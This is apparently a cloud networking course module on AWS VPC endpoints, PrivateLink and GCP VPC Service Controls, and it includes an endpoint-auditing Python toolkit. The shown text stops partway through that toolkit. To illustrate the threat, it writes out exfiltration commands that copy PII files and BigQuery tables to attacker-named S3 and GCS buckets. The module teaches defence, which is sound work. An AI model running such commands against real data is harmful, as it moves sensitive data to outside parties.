# M35: Private Endpoints and VPC Service Controls

**Course:** SYS-NET-102 — Cloud Networking and Security  
**Module:** 04 of 05  
**Global Module ID:** M35  
**Semester:** 1  
**School:** Systems (SYS)

---

## Table of Contents

1. [The Why](#1-the-why)
2. [Mental Model](#2-mental-model)
3. [Core Concepts](#3-core-concepts)
4. [Hands-On Walkthrough](#4-hands-on-walkthrough)
5. [Code Toolkit](#5-code-toolkit)
6. [Visual Reference](#6-visual-reference)
7. [Common Mistakes](#7-common-mistakes)
8. [Production Failure Scenarios](#8-production-failure-scenarios)
9. [Performance and Tuning](#9-performance-and-tuning)
10. [Interview Q&A](#10-interview-qa)
11. [Cross-Question Chain](#11-cross-question-chain)
12. [Flashcards](#12-flashcards)
13. [Further Reading](#13-further-reading)
14. [Lab Exercises](#14-lab-exercises)
15. [Key Takeaways](#15-key-takeaways)
16. [Connections to Other Modules](#16-connections-to-other-modules)
17. [Anti-Patterns](#17-anti-patterns)
18. [Tools Reference](#18-tools-reference)
19. [Glossary](#19-glossary)
20. [Self-Assessment](#20-self-assessment)
21. [Module Summary](#21-module-summary)

---

## 1. The Why

By default, when a data pipeline running on EC2 reads from S3 or writes to BigQuery, the traffic travels over the public internet. The data leaves your cloud VPC, enters the public internet backbone, reaches the cloud provider's public API endpoint, and the response travels back. This path has three significant problems for data engineering workloads.

The first is cost. Data leaving a VPC over the public internet (via NAT gateway) costs $0.045 per GB in AWS. A Spark cluster reading 10 TB/day from S3 through NAT gateway costs approximately $450/day — $164,000/year — just in egress fees. The S3 Gateway VPC endpoint eliminates this entirely: it costs nothing and routes S3 traffic within the AWS network without touching the NAT gateway.

The second is security exposure. Traffic traversing the public internet is subject to IP spoofing, BGP hijacking, and man-in-the-middle attacks — even when TLS-encrypted. More practically, the fact that traffic exits your VPC's private address space means that a misconfigured security group or accidental public IP assignment on an EC2 instance could enable exfiltration through the public internet path rather than being confined to your private network topology.

The third, and most critical for compliance-regulated data platforms, is data exfiltration. IAM (M33) controls what an identity can do. Security groups (M34) control which hosts can connect to which other hosts. But neither prevents a legitimate, correctly-authenticated AWS user from `aws s3 cp s3://sensitive-bucket ./` from an EC2 instance and uploading the data to `s3://attacker-controlled-bucket/`. Both operations are valid S3 API calls, the user has permission for both, and the security group allows the traffic. VPC Service Controls (in GCP) and S3 bucket policies combined with VPC endpoint policies (in AWS) are the controls that prevent this class of attack — data exfiltration through valid API calls by compromised or malicious insiders.

Private endpoints are both the cost optimization tool and the security enforcement point. VPC Service Controls build an additional perimeter around GCP services that operates above the IAM layer. Together they form the final layer of cloud network security for data platforms.

---

## 2. Mental Model

### The Traffic Path Problem

Consider a Spark job running on EC2 in a private subnet reading from S3:

**Without VPC endpoint (default path):**
```
Spark EC2 (10.0.1.5) → [private subnet] → NAT Gateway → [public internet] 
→ s3.amazonaws.com (52.x.x.x) → response → NAT Gateway → Spark
```

The traffic exits the AWS network entirely, traverses the public internet, and re-enters AWS at the S3 public endpoint. You pay NAT gateway data processing fees ($0.045/GB) plus NAT gateway hourly fees ($0.045/hr/AZ).

**With S3 Gateway VPC endpoint:**
```
Spark EC2 (10.0.1.5) → [private subnet] → [route table entry for S3 via vpce] 
→ AWS internal network → S3 bucket → response → Spark
```

The traffic never leaves the AWS network. There is no NAT gateway involvement. The S3 Gateway endpoint costs nothing and adds no latency — it's a routing change, not a proxy.

### Two Types of VPC Endpoints

AWS has two endpoint types with fundamentally different architectures:

**Gateway endpoints** (S3 and DynamoDB only): A routing entry added to your VPC route tables that directs S3/DynamoDB traffic through the AWS internal network. No ENI is created, no IP address is assigned, no per-hour cost. The endpoint appears in route tables as a target (`vpce-xxx`). Works only for resources in the VPC where the route tables exist.

**Interface endpoints** (most AWS services): An ENI (Elastic Network Interface) with a private IP address is created in your subnet. DNS entries are created that resolve the service's public hostname (e.g., `secretsmanager.us-east-1.amazonaws.com`) to this private IP instead of the public IP. Traffic to the service is handled by AWS PrivateLink — a private fiber connection within the AWS backbone. Costs $0.01/hr/AZ/endpoint + $0.01/GB data processed.

### VPC Service Controls: API-Level Perimeter

In GCP, VPC Service Controls operate at an entirely different layer than VPC firewall rules and IAM. They define a security perimeter around GCP services (BigQuery, GCS, Pub/Sub, Dataflow, etc.) that restricts which resources can access those services, regardless of IAM permissions.

The mental model: IAM answers "is this identity authorized to do this action?" VPC Service Controls answers "is this request coming from a trusted context?" Even if IAM says yes, VPC SC can say no — if the request originates from outside the defined perimeter (wrong project, wrong VPC, wrong IP range), the request is denied with `PERMISSION_DENIED: Request is prohibited by organization's policy`.

This is the key control for preventing data exfiltration in GCP: even if an attacker steals a service account key and tries to call `bq extract` from an external machine to copy BigQuery data to their own GCS bucket, VPC SC blocks the request because it originates from outside the protected perimeter.

---

## 3. Core Concepts

### 3.1 S3 Gateway VPC Endpoint

An S3 Gateway VPC endpoint requires:
1. Creating the endpoint in your VPC (specifying which route tables to add it to)
2. Optionally: an endpoint policy (JSON IAM-like policy restricting which S3 buckets can be accessed through this endpoint)

The endpoint creates entries in your route tables: traffic destined for S3's IP prefixes (from the AWS-managed prefix list `pl-xxxxxxxx`) is routed through the endpoint, bypassing NAT gateway.

```bash
# Create an S3 Gateway endpoint, adding it to all private subnet route tables
VPC_ID="vpc-0abc123"
ROUTE_TABLE_IDS="rtb-private-1a rtb-private-1b rtb-private-1c"

aws ec2 create-vpc-endpoint \
  --vpc-id $VPC_ID \
  --service-name com.amazonaws.us-east-1.s3 \
  --vpc-endpoint-type Gateway \
  --route-table-ids $ROUTE_TABLE_IDS \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-data-*",
        "arn:aws:s3:::company-data-*/*"
      ]
    }]
  }'
```

The endpoint policy acts as a second IAM evaluation layer: requests going through the endpoint must satisfy BOTH the caller's IAM policy AND the endpoint policy. Restricting the endpoint policy to company-owned buckets (`company-data-*`) means that even if a Spark job's IAM role has broad S3 permissions, it cannot use the private network path to access external buckets. To reach an external bucket, it would need to route through NAT gateway — where you can apply additional controls.

### 3.2 Interface Endpoints (AWS PrivateLink)

Interface endpoints are needed for all AWS services other than S3 and DynamoDB. Common ones for data platforms:

| Service | Service Name | Use Case |
|---------|-------------|----------|
| Secrets Manager | `com.amazonaws.REGION.secretsmanager` | Airflow DB password, Kafka credentials |
| KMS | `com.amazonaws.REGION.kms` | S3 SSE-KMS encryption/decryption |
| STS | `com.amazonaws.REGION.sts` | IRSA token exchange (EKS workloads) |
| ECR API | `com.amazonaws.REGION.ecr.api` | Container image metadata |
| ECR DKR | `com.amazonaws.REGION.ecr.dkr` | Container image layers pull |
| CloudWatch Logs | `com.amazonaws.REGION.logs` | Log delivery from EC2/EKS |
| SSM | `com.amazonaws.REGION.ssm` | Parameter Store, Session Manager |
| Glue | `com.amazonaws.REGION.glue` | Glue catalog API calls |
| Kinesis | `com.amazonaws.REGION.kinesis-streams` | Kinesis producer/consumer |

For a fully private Kubernetes cluster (no internet access), you need at minimum: ECR API, ECR DKR, STS, and S3 Gateway endpoints so nodes can pull images and exchange IRSA tokens.

### 3.3 Private DNS for Interface Endpoints

When you create an interface endpoint with private DNS enabled, AWS creates Route 53 private hosted zone entries that resolve the public service hostname to the endpoint's private IP:

```
Without private DNS:
  secretsmanager.us-east-1.amazonaws.com → 54.x.x.x (public IP)

With private DNS on interface endpoint:
  secretsmanager.us-east-1.amazonaws.com → 10.0.1.100 (ENI private IP in your VPC)
```

Your applications don't need to change their code — they still reference `secretsmanager.us-east-1.amazonaws.com`, but inside the VPC that hostname now resolves to the private endpoint IP rather than the public AWS IP.

**Critical requirement:** Private DNS on interface endpoints requires that your VPC has `enableDnsHostnames` and `enableDnsSupport` set to `true`. If either is disabled, the private DNS override doesn't work and applications fall back to public IPs.

```bash
# Verify VPC DNS settings
aws ec2 describe-vpc-attribute \
  --vpc-id vpc-0abc123 \
  --attribute enableDnsSupport

aws ec2 describe-vpc-attribute \
  --vpc-id vpc-0abc123 \
  --attribute enableDnsHostnames
```

### 3.4 Endpoint Policies: The Exfiltration Prevention Layer

The most security-relevant use of VPC endpoints is combining endpoint policies with S3 bucket policies to create a two-sided control that prevents exfiltration.

**The exfiltration scenario without endpoint policies:**

A data engineer on an EC2 instance (with legitimate data access) runs:
```bash
# Legitimate: copy from company bucket to company bucket
aws s3 cp s3://company-datalake/pii-data.parquet s3://company-reports/

# Exfiltration: copy from company bucket to attacker's external bucket
aws s3 cp s3://company-datalake/pii-data.parquet s3://attacker-exfiltration-bucket/
```

Both commands are valid S3 API calls. The IAM role allows `s3:GetObject` on `company-datalake` (required for legitimate work). The role also implicitly allows writing to any bucket if it has `s3:PutObject "*"`. The security group allows the traffic. Without endpoint policies, the second command succeeds.

**Endpoint policy to prevent exfiltration:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::company-*",
        "arn:aws:s3:::company-*/*"
      ]
    }
  ]
}
```

This endpoint policy allows S3 operations through the endpoint ONLY to buckets matching `company-*`. An `aws s3 cp` to `attacker-exfiltration-bucket` would be blocked at the endpoint level with `Access Denied` — even if the IAM role technically permits it — because the destination bucket doesn't match the endpoint policy.

**What about NAT gateway bypass?**

The endpoint policy prevents using the private endpoint path to exfiltrate. However, if the EC2 instance also has NAT gateway access (a route to the internet), traffic to `attacker-exfiltration-bucket` can route through NAT gateway instead. To fully close the exfiltration path, you need BOTH:
1. An endpoint policy restricting which buckets can be accessed through the endpoint
2. An outbound security group rule that restricts internet access (or completely removes NAT gateway from sensitive subnets)

The complete defense: data processing instances in production subnets have no NAT gateway route, only the S3 Gateway endpoint. They can only reach S3 via the endpoint, which is restricted by the endpoint policy to company-owned buckets. There is no path to external buckets.

### 3.5 GCP VPC Service Controls

GCP VPC Service Controls create a security perimeter around GCP services at the organization level. They are configured via Access Context Manager and deployed as Service Perimeter resources.

**Key concepts:**

**Service Perimeter:** Defines which GCP projects are inside the perimeter and which services are protected. Requests originating from inside the perimeter to protected services are allowed. Requests from outside are blocked unless explicitly permitted by Access Levels.

**Access Level:** A condition that defines a "trusted context" — can be based on IP ranges, device policy (managed device), user identity, or VPN connectivity. Access Levels allow external requests to pass the perimeter check when they meet specific conditions.

**Protected services:** The list of GCP APIs whose requests are checked against the perimeter. For data platforms: BigQuery, Cloud Storage, Pub/Sub, Dataflow, Dataproc, Vertex AI, Cloud SQL.

```
Perimeter: "data-platform-perimeter"
  Projects inside: data-production, data-staging, shared-infrastructure
  Protected services: BigQuery, GCS, Pub/Sub, Dataflow
  
  Access levels:
    - "corp-network": IP range 203.0.113.0/24 (corporate office)
    - "managed-device": device with policy compliance
  
  Ingress rule: Allow requests from outside perimeter IF using Access Level "corp-network"
  Egress rule: Allow data to leave perimeter ONLY to projects in "company-org/projects/*"
```

**Dry-run mode:** VPC Service Controls support a dry-run (audit) mode where violations are logged but not enforced. Essential for validating perimeter configuration before enabling enforcement — misconfiguring VPC SC can block all BigQuery access for an entire project.

### 3.6 VPC SC for Data Exfiltration Prevention

The canonical data exfiltration scenario in GCP:

**Without VPC SC:** A malicious insider or compromised service account with BigQuery access runs:
```bash
# Exfiltration: copy BQ table to GCS bucket outside the organization
bq extract --destination_format=CSV \
  project:dataset.sensitive_table \
  gs://attacker-bucket-in-different-project/data.csv
```

IAM says the service account has `roles/bigquery.dataViewer` on the table and `roles/storage.objectCreator` on the destination bucket. Both permissions are valid. The request succeeds, and the data is now in an attacker-controlled GCS bucket.

**With VPC SC:** The egress rule for the perimeter restricts BigQuery `extract` operations to GCS buckets within the perimeter's projects. `gs://attacker-bucket-in-different-project/` is outside the perimeter. The request is blocked:
```
Error: PERMISSION_DENIED: Request is prohibited by organization's policy. 
vpcServiceControlsUniqueIdentifier: abc123xyz
```

The policy enforcement happens at the Google API level, before the IAM check even runs (or after — depending on the service). The VPC SC violation is logged to Cloud Audit Logs for forensic review.

### 3.7 Private Google Access

In GCP, VMs in private subnets (no external IP) cannot reach Google APIs (BigQuery, GCS, Pub/Sub) by default — these APIs have public IP addresses. Private Google Access enables VMs with only internal IPs to reach Google APIs through Google's internal network, without needing a NAT gateway or external IP.

**Enable per subnet:**
```bash
gcloud compute networks subnets update data-platform-subnet \
  --region=us-central1 \
  --enable-private-ip-google-access
```

With Private Google Access enabled, a VM with IP `10.0.1.5` (no external IP) can call BigQuery and GCS directly. Without it, those API calls fail — the VM has no route to `storage.googleapis.com`'s public IPs.

**Private Service Connect** is the GCP Interface Endpoint equivalent — it creates a private endpoint within a VPC that connects to Google-managed services (or customer-published services) using an internal IP address and Private Google Access.

### 3.8 AWS PrivateLink for Cross-Account Data Sharing

AWS PrivateLink (the technology underlying Interface endpoints) can also be used to privately share services between accounts without VPC peering. A service provider account runs a Network Load Balancer; a service consumer creates an Interface endpoint in their VPC that connects to the NLB via the AWS backbone.

For data engineering: used when a shared data platform team exposes a data catalog API or a metrics service to consuming teams, each in their own accounts, without requiring VPC peering or Transit Gateway. Each consumer creates an interface endpoint; the traffic never leaves the AWS backbone.

```
Provider account (data-platform-team):
  NLB → Glue Data Catalog service (ECS service)
  PrivateLink endpoint service: com.amazonaws.vpce.us-east-1.vpce-svc-0abc123

Consumer account (ml-team):
  Interface endpoint → vpce-svc-0abc123
  Private DNS: catalog.internal.company.com → 10.0.5.8 (endpoint ENI IP)
```

---

## 4. Hands-On Walkthrough

### 4.1 Verify S3 Traffic Is Using the VPC Endpoint

```bash
# Check that an S3 Gateway endpoint exists and which route tables it's attached to
aws ec2 describe-vpc-endpoints \
  --filters "Name=vpc-id,Values=vpc-0abc123" \
            "Name=service-name,Values=com.amazonaws.us-east-1.s3" \
  --query 'VpcEndpoints[*].{
    EndpointId: VpcEndpointId,
    State: State,
    RouteTables: RouteTableIds,
    Policy: PolicyDocument
  }' \
  --output json

# Verify the route table has the endpoint as a target for S3 prefixes
aws ec2 describe-route-tables \
  --route-table-ids rtb-private-1a \
  --query 'RouteTables[0].Routes[?GatewayId!=null] | 
           [?starts_with(GatewayId, `vpce`)]'

# From inside an EC2 instance in the private subnet:
# Test that S3 access works WITHOUT going through NAT
# (Trace route to S3 to verify it stays within AWS network)
traceroute s3.amazonaws.com
# With endpoint: should reach S3 without hopping through a NAT gateway IP
# Without endpoint: first hop is the NAT gateway IP (10.0.x.x from NAT)

# More definitive test: check VPC flow logs
# With endpoint, S3 traffic will show the destination as the prefix list,
# not an external IP, and action=ACCEPT with no NAT hop
```

### 4.2 Creating a Secrets Manager Interface Endpoint

```bash
# Create Secrets Manager interface endpoint in all private subnets
VPC_ID="vpc-0abc123"
SUBNET_IDS="subnet-private-1a subnet-private-1b subnet-private-1c"
SG_ID="sg-endpoints"  # A security group allowing HTTPS 443 from VPC CIDR

ENDPOINT_ID=$(aws ec2 create-vpc-endpoint \
  --vpc-id $VPC_ID \
  --service-name com.amazonaws.us-east-1.secretsmanager \
  --vpc-endpoint-type Interface \
  --subnet-ids $SUBNET_IDS \
  --security-group-ids $SG_ID \
  --private-dns-enabled \
  --query 'VpcEndpoint.VpcEndpointId' \
  --output text)

echo "Created endpoint: $ENDPOINT_ID"

# Wait for the endpoint to become available
aws ec2 wait vpc-endpoint-available --vpc-endpoint-ids $ENDPOINT_ID

# Verify DNS resolution from inside the VPC resolves to a private IP
# (Run this from an EC2 instance in the same VPC)
dig secretsmanager.us-east-1.amazonaws.com
# Should return a 10.x.x.x address (the endpoint ENI IP), not a public IP

# Test actual Secrets Manager access through the endpoint
aws secretsmanager get-secret-value \
  --secret-id /data-platform/kafka/sasl-password \
  --region us-east-1
```

### 4.3 Auditing Endpoint Policies

```bash
# Check if the S3 endpoint policy restricts access to company buckets
ENDPOINT_ID="vpce-0abc123"

aws ec2 describe-vpc-endpoints \
  --vpc-endpoint-ids $ENDPOINT_ID \
  --query 'VpcEndpoints[0].PolicyDocument' \
  --output text | python3 -m json.tool

# Check if any bucket policies require that requests come through the VPC endpoint
# (The condition key is aws:sourceVpce)
aws s3api get-bucket-policy \
  --bucket company-datalake \
  --query 'Policy' \
  --output text | python3 -m json.tool

# Example bucket policy that REQUIRES requests to use the VPC endpoint:
# {
#   "Condition": {
#     "StringNotEquals": {
#       "aws:sourceVpce": "vpce-0abc123"
#     }
#   }
# }
# Effect: Deny — requests not coming through the VPC endpoint are denied
```

### 4.4 GCP VPC Service Controls Setup

```bash
# List existing access policies and service perimeters
gcloud access-context-manager policies list

# View a perimeter's configuration
gcloud access-context-manager perimeters describe data-platform-perimeter \
  --policy=POLICY_ID

# Add a project to an existing service perimeter
gcloud access-context-manager perimeters update data-platform-perimeter \
  --policy=POLICY_ID \
  --add-resources="projects/987654321"

# Enable dry-run mode to log violations before enforcing
gcloud access-context-manager perimeters dry-run create data-platform-perimeter \
  --policy=POLICY_ID \
  --type=REGULAR \
  --title="Data Platform Perimeter" \
  --resources="projects/123456789,projects/987654321" \
  --restricted-services="bigquery.googleapis.com,storage.googleapis.com" \
  --ingress-policies=ingress.yaml \
  --egress-policies=egress.yaml

# View dry-run violation logs (before enforcing)
gcloud logging read \
  'protoPayload.metadata."@type"="type.googleapis.com/google.cloud.audit.BigQueryAuditMetadata"
   AND protoPayload.status.code=7
   AND protoPayload.metadata.violationReason="VPC_SERVICE_CONTROLS"' \
  --freshness=1d \
  --project=data-production
```

---

## 5. Code Toolkit

```python
#!/usr/bin/env python3
"""
endpoint_diagnostics.py

Diagnostic toolkit for AWS VPC endpoints and GCP VPC Service Controls.
Audits endpoint coverage, validates endpoint policies, estimates cost savings,
and checks for common exfiltration vectors.

Dependencies: boto3 (AWS), optional google-cloud-compute (GCP)
"""

import os
import re
import json
import time
import socket
from dataclasses import dataclass, field
from typing import Optional


# ─── Data Structures ────────────────────────────────────────────────────────────

@dataclass
class VPCEndpointInfo:
    endpoint_id: str
    service_name: str
    endpoint_type: str          # Gateway or Interface
    state: str
    vpc_id: str
    route_table_ids: list[str]  # For Gateway endpoints
    subnet_ids: list[str]       # For Interface endpoints
    private_dns_enabled: bool   # For Interface endpoints
    policy_document: Optional[dict]
    has_restrictive_policy: bool  # True if policy limits resources (not allow-all)


@dataclass
class EndpointCoverageReport:
    vpc_id: str
    region: str
    has_s3_endpoint: bool
    has_dynamodb_endpoint: bool
    interface_endpoints: list[str]   # service names
    missing_recommended: list[str]   # services used but not have endpoints
    monthly_savings_estimate_usd: float
    exfiltration_risks: list[str]


@dataclass
class EndpointPolicyIssue:
    endpoint_id: str
    service_name: str
    issue_type: str    # "allow_all", "no_resource_restriction", "no_principal_restriction"
    description: str
    recommendation: str


@dataclass
class S3TrafficEstimate:
    vpc_id: str
    nat_gateway_id: Optional[str]
    estimated_s3_gb_per_month: float
    nat_cost_per_month_usd: float
    endpoint_cost_per_month_usd: float   # $0 for Gateway endpoint
    monthly_savings_usd: float


# ─── AWS Endpoint Auditor ────────────────────────────────────────────────────────

class VPCEndpointAuditor:
    """
    Audits AWS VPC endpoints for coverage, cost optimization, and security policy.
    """

    # Services commonly used by data platforms — should have interface endpoints
    RECOMMENDED_SERVICES = {
        'secretsmanager': 'Secrets Manager — used for DB passwords, API keys',
        'kms': 'KMS — used for S3 SSE-KMS, EMR encryption',
        'sts': 'STS — required for IRSA (EKS IAM roles for service accounts)',
        'ecr.api': 'ECR API — required for EKS node image pulls (image metadata)',
        'ecr.dkr': 'ECR DKR — required for EKS node image pulls (image layers)',
        'logs': 'CloudWatch Logs — used for Spark/Airflow/Kafka log delivery',
        'glue': 'Glue — used for Glue catalog API calls from Spark/Athena',
        'kinesis-streams': 'Kinesis — used for Kinesis producer/consumer',
        'execute-api': 'API Gateway — used for internal API calls',
        'ssm': 'SSM — used for parameter store and session manager',
    }

    # S3 Gateway endpoint is free and should always be present
    GATEWAY_SERVICES = {'s3', 'dynamodb'}

    def __init__(self, region: str = None):
        try:
            import boto3
            self.ec2 = boto3.client(
                'ec2',
                region_name=region or os.environ.get('AWS_DEFAULT_REGION', 'us-east-1')
            )
            self.region = region or os.environ.get('AWS_DEFAULT_REGION', 'us-east-1')
        except ImportError:
            raise RuntimeError("boto3 not installed. Run: pip install boto3")

    def get_endpoints(self, vpc_id: str) -> list[VPCEndpointInfo]:
        """Get all VPC endpoints in a VPC."""
        paginator = self.ec2.get_paginator('describe_vpc_endpoints')
        endpoints = []

        for page in paginator.paginate(
            Filters=[
                {'Name': 'vpc-id', 'Values': [vpc_id]},
                {'Name': 'vpc-endpoint-state', 'Values': ['available', 'pending']},
            ]
        ):
            for ep in page['VpcEndpoints']:
                policy = None
                has_restrictive = False
                policy_str = ep.get('PolicyDocument')

                if policy_str:
                    try:
                        policy = json.loads(policy_str)
                        # Check if policy restricts resources (not wildcard)
                        for stmt in policy.get('Statement', []):
                            resources = stmt.get('Resource', '*')
                            if isinstance(resources, str) and resources != '*':
                                has_restrictive = True
                            elif isinstance(resources, list) and \
                                 not any(r == '*' for r in resources):
                                has_restrictive = True
                    except json.JSONDecodeError:
                        pass

                endpoints.append(VPCEndpointInfo(
                    endpoint_id=ep['VpcEndpointId'],
                    service_name=ep['ServiceName'],
                    endpoint_type=ep['VpcEndpointType'],
                    state=ep['State'],
                    vpc_id=vpc_id,
                    route_table_ids=ep.get('RouteTableIds', []),
                    subnet_ids=ep.get('SubnetIds', []),
                    private_dns_enabled=ep.get('PrivateDnsEnabled', False),
                    policy_document=policy,
                    has_restrictive_policy=has_restrictive,
                ))

        return endpoints

    def generate_coverage_report(self, vpc_id: str) -> EndpointCoverageReport:
        """Generate endpoint coverage report for a VPC."""
        endpoints = self.get_endpoints(vpc_id)
        service_short = {
            ep.service_name.split('.')[-1]: ep
            for ep in endpoints
        }

        has_s3 = 's3' in service_short
        has_dynamodb = 'dynamodb' in service_short
        interface_eps = [
            ep.service_name for ep in endpoints
            if ep.endpoint_type == 'Interface'
        ]

        # Identify missing recommended services
        missing = []
        for svc_short, description in self.RECOMMENDED_SERVICES.items():
            if svc_short not in service_short:
                missing.append(f"{svc_short}: {description}")

        # Cost savings estimate: interface endpoints cost $0.01/hr/AZ
        # S3 Gateway costs nothing but saves NAT gateway data processing
        # Rough estimate: $0.045/GB saved on S3 traffic that would go through NAT
        nat_gw_count = self._count_nat_gateways(vpc_id)
        savings = 0.0
        if not has_s3:
            savings += 500.0  # Estimate: typical S3 traffic savings of $500/month
        if not has_dynamodb:
            savings += 50.0   # Rough DynamoDB estimate

        # Exfiltration risks
        exfil_risks = []
        if has_s3:
            for ep in endpoints:
                if 's3' in ep.service_name and not ep.has_restrictive_policy:
                    exfil_risks.append(
                        "S3 Gateway endpoint policy is allow-all: no restriction "
                        "on which S3 buckets can be accessed. An attacker could "
                        "use the private path to exfiltrate data to external buckets."
                    )
        if not has_s3:
            exfil_risks.append(
                "No S3 Gateway endpoint: S3 traffic may route through NAT gateway. "
                "If the NAT gateway allows outbound to 0.0.0.0/0, there is no "
                "network-level restriction preventing data exfiltration to S3."
            )

        return EndpointCoverageReport(
            vpc_id=vpc_id,
            region=self.region,
            has_s3_endpoint=has_s3,
            has_dynamodb_endpoint=has_dynamodb,
            interface_endpoints=interface_eps,
            missing_recommended=missing,
            monthly_savings_estimate_usd=savings,
            exfiltration_risks=exfil_risks,
        )

    def audit_endpoint_policies(self, vpc_id: str) -> list[EndpointPolicyIssue]:
        """Find endpoint policy issues (overly permissive or missing)."""
        endpoints = self.get_endpoints(vpc_id)
        issues = []

        for ep in endpoints:
            if not ep.policy_document:
                continue

            for stmt in ep.policy_document.get('Statement', []):
                effect = stmt.get('Effect', 'Allow')
                principal = stmt.get('Principal', '*')
                resources = stmt.get('Resource', '*')
                actions = stmt.get('Action', '*')

                if effect == 'Allow':
                    # Check for wildcard principal
                    if principal == '*':
                        # Allow-all principal is normal for Gateway endpoints
                        # (principal is the IAM identity, controlled by IAM)
                        pass

                    # Check for wildcard resource (the critical check)
                    resource_is_wildcard = (
                        resources == '*' or
                        (isinstance(resources, list) and '*' in resources)
                    )
                    if resource_is_wildcard and 's3' in ep.service_name:
                        issues.append(EndpointPolicyIssue(
                            endpoint_id=ep.endpoint_id,
                            service_name=ep.service_name,
                            issue_type='no_resource_restriction',
                            description=(
                                "S3 endpoint policy allows access to all S3 buckets (*). "
                                "An authorized IAM user can use this private path to "
                                "access any S3 bucket, including attacker-controlled ones."
                            ),
                            recommendation=(
                                "Restrict the endpoint policy to company-owned buckets: "
                                "\"Resource\": [\"arn:aws:s3:::company-*\", "
                                "\"arn:aws:s3:::company-*/*\"]"
                            ),
                        ))

                    # Check for overly broad actions
                    action_is_wildcard = (
                        actions == '*' or
                        (isinstance(actions, list) and '*' in actions)
                    )
                    if not action_is_wildcard and isinstance(actions, list):
                        dangerous = [a for a in actions if 'Delete' in a or 'Destroy' in a]
                        if dangerous:
                            issues.append(EndpointPolicyIssue(
                                endpoint_id=ep.endpoint_id,
                                service_name=ep.service_name,
                                issue_type='destructive_actions_allowed',
                                description=f"Endpoint allows destructive actions: {dangerous}",
                                recommendation=(
                                    "Remove destructive actions (Delete, Destroy) from "
                                    "the endpoint policy unless explicitly required."
                                ),
                            ))

        return issues

    def estimate_s3_nat_savings(
        self,
        vpc_id: str,
        estimated_s3_gb_per_month: float,
    ) -> S3TrafficEstimate:
        """Estimate monthly cost savings from adding S3 Gateway endpoint."""
        nat_gateways = self._count_nat_gateways(vpc_id)
        endpoints = self.get_endpoints(vpc_id)
        has_s3 = any('s3' in ep.service_name for ep in endpoints)

        # NAT gateway data processing: $0.045/GB
        # S3 Gateway endpoint: free
        nat_cost_per_month = estimated_s3_gb_per_month * 0.045
        endpoint_cost_per_month = 0.0  # Gateway endpoint is free

        return S3TrafficEstimate(
            vpc_id=vpc_id,
            nat_gateway_id=None,  # Simplified
            estimated_s3_gb_per_month=estimated_s3_gb_per_month,
            nat_cost_per_month_usd=nat_cost_per_month if not has_s3 else 0.0,
            endpoint_cost_per_month_usd=endpoint_cost_per_month,
            monthly_savings_usd=nat_cost_per_month if not has_s3 else 0.0,
        )

    def _count_nat_gateways(self, vpc_id: str) -> int:
        """Count NAT gateways in a VPC."""
        try:
            resp = self.ec2.describe_nat_gateways(
                Filter=[
                    {'Name': 'vpc-id', 'Values': [vpc_id]},
                    {'Name': 'state', 'Values': ['available']},
                ]
            )
            return len(resp.get('NatGateways', []))
        except Exception:
            return 0


# ─── Endpoint DNS Validator ───────────────────────────────────────────────────────

def validate_private_dns(service_hostname: str, expected_private_cidr: str = None) -> dict:
    """
    Validate that a service hostname resolves to a private IP (interface endpoint active)
    rather than a public IP (traffic going via internet).

    Returns dict with: hostname, resolved_ips, is_private, diagnosis
    """
    try:
        resolved = socket.getaddrinfo(service_hostname, None)
        ips = list({r[4][0] for r in resolved})
    except socket.gaierror as e:
        return {
            'hostname': service_hostname,
            'resolved_ips': [],
            'is_private': None,
            'diagnosis': f'DNS resolution failed: {e}',
        }

    private_ranges = [
        '10.',
        '172.16.', '172.17.', '172.18.', '172.19.',
        '172.20.', '172.21.', '172.22.', '172.23.',
        '172.24.', '172.25.', '172.26.', '172.27.',
        '172.28.', '172.29.', '172.30.', '172.31.',
        '192.168.',
    ]

    is_private = all(
        any(ip.startswith(prefix) for prefix in private_ranges)
        for ip in ips
    )

    if is_private:
        diagnosis = (
            f"GOOD: {service_hostname} resolves to private IP(s) {ips}. "
            f"Interface endpoint with private DNS is active."
        )
    else:
        diagnosis = (
            f"WARNING: {service_hostname} resolves to public IP(s) {ips}. "
            f"Traffic is NOT using an interface endpoint — it will go through NAT "
            f"or fail if there is no internet access. "
            f"Create an interface endpoint with private DNS enabled."
        )

    return {
        'hostname': service_hostname,
        'resolved_ips': ips,
        'is_private': is_private,
        'diagnosis': diagnosis,
    }


def check_common_endpoint_dns(region: str = 'us-east-1') -> list[dict]:
    """
    Check DNS resolution for common AWS services that should have private endpoints.
    Run this from inside a VPC to verify endpoint configuration.
    """
    services = {
        f'secretsmanager.{region}.amazonaws.com': 'Secrets Manager',
        f'kms.{region}.amazonaws.com': 'KMS',
        f'sts.{region}.amazonaws.com': 'STS',
        f'api.ecr.{region}.amazonaws.com': 'ECR API',
        f'logs.{region}.amazonaws.com': 'CloudWatch Logs',
        f'ssm.{region}.amazonaws.com': 'SSM',
    }

    results = []
    for hostname, name in services.items():
        result = validate_private_dns(hostname)
        result['service_name'] = name
        results.append(result)

    return results


# ─── Exfiltration Risk Analyzer ───────────────────────────────────────────────────

def analyze_exfiltration_vectors(
    vpc_id: str = None,
    region: str = 'us-east-1',
) -> list[dict]:
    """
    Identify potential data exfiltration vectors based on endpoint and NAT configuration.
    Does not require live AWS access when running in demo mode.
    """
    vectors = []

    # Vector 1: S3 without endpoint policy restriction
    vectors.append({
        'vector': 'S3 without bucket restriction on endpoint policy',
        'description': (
            'If the S3 Gateway endpoint policy allows Resource: *, any authorized IAM '
            'principal can use the private path to copy data to any S3 bucket — including '
            'attacker-controlled ones in different AWS accounts.'
        ),
        'detection': 'Check endpoint policy: aws ec2 describe-vpc-endpoints --query PolicyDocument',
        'mitigation': (
            'Set endpoint policy Resource to company-owned bucket ARNs only: '
            '"arn:aws:s3:::company-*" and "arn:aws:s3:::company-*/*"'
        ),
        'severity': 'HIGH',
    })

    # Vector 2: NAT gateway as exfiltration path
    vectors.append({
        'vector': 'NAT gateway in sensitive subnet',
        'description': (
            'If sensitive data processing instances (with access to PII data) have a '
            'route to a NAT gateway, they can send traffic to any internet destination. '
            'An attacker can exfiltrate data by posting it to an external HTTPS endpoint '
            'or uploading to an external S3-compatible service.'
        ),
        'detection': (
            'Check route tables for 0.0.0.0/0 → igw or nat routes: '
            'aws ec2 describe-route-tables --filters Name=vpc-id,Values=VPC_ID'
        ),
